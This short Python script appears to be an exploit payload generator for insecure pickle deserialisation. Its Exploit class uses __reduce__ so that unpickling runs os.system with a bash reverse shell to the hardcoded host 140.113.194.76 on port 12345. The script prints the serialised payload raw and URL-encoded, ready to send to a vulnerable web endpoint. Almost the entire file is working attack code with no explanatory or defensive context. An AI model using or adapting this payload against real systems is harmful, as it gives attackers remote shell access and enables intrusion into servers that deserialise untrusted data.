import os
import pickle
import sys
import urllib.parse

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/140.113.194.76/12345 0>&1'",))
#        return (os.system, ("ls", ))


shellcode = pickle.dumps(Exploit())
str_sc = str(shellcode)[1:]

print(str_sc)
print(urllib.parse.quote(str_sc))
